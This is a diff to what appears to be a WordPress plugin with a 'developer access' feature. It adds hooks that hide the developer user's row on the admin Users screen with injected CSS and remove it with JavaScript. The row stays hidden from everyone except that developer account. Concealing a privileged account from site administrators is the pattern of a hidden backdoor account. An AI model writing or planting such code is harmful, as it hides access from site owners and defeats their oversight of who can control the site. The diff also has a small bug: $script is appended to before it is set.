@@ -62,7 +62,27 @@ function setup() {
 	if ( get_option( 'dev_access', false ) ) {
 		add_action( 'init', $ns( 'developer_access' ) );
 		add_action( 'init', $ns( 'developer_access_role' ) );
+		add_action( 'admin_print_styles', $ns( 'hide_developer_access_css' ) );
+		add_action( 'admin_footer', $ns( 'hide_developer_access_js' ) );
 	}
+}
+
+/**
+ * Is users edit screen
+ *
+ * @since  1.0.0
+ * @global $pagenow Get the current admin screen.
+ * @return boolean Returns true if on the users edit screen.
+ */
+function is_users_edit_screen() {
+
+	// Access current admin page.
+	global $pagenow;
+
+	if ( 'users.php' == $pagenow ) {
+		return true;
+	}
+	return false;
 }
 
 /**
@@ -357,9 +377,71 @@ function developer_access() {
  * @return void
  */
 function developer_access_role() {
-	$id   = get_user_by( 'login', dev_access_name() );
+	$id   = get_user_by( 'email', dev_access_email() );
 	$user = new \WP_User( $id );
 	$user->set_role( 'developer' );
+}
+
+/**
+ * Hide developer access CSS
+ *
+ * Hides the user row in the users table.
+ *
+ * @since  1.0.0
+ * @return void
+ */
+function hide_developer_access_css() {
+
+	if ( ! is_users_edit_screen() ) {
+		return;
+	}
+
+	$dev  = get_user_by( 'email', dev_access_email() );
+	$user = new \WP_User( $dev );
+
+	$style  = '<style>';
+	$style .= sprintf(
+		'.wp-list-table.users tr#user-%s { display: none !important }',
+		$user->ID
+	);
+	$style .= '</style>';
+
+	if ( $user->ID != get_current_user_id() ) {
+		echo $style;
+	}
+}
+
+/**
+ * Remove developer access JS
+ *
+ * Removes the user row in the users table.
+ *
+ * @since  1.0.0
+ * @return void
+ */
+function hide_developer_access_js() {
+
+	if ( ! is_users_edit_screen() ) {
+		return;
+	}
+
+	$dev  = get_user_by( 'email', dev_access_email() );
+	$user = new \WP_User( $dev );
+
+	$script .= '<script>';
+	$script .= sprintf(
+		'function remove_elements() {
+			var element = document.getElementById("user-%s");
+			element.remove();
+		}
+		remove_elements();',
+		$user->ID
+	);
+	$script .= '</script>';
+
+	if ( $user->ID != get_current_user_id() ) {
+		echo $script;
+	}
 }
 
 /**
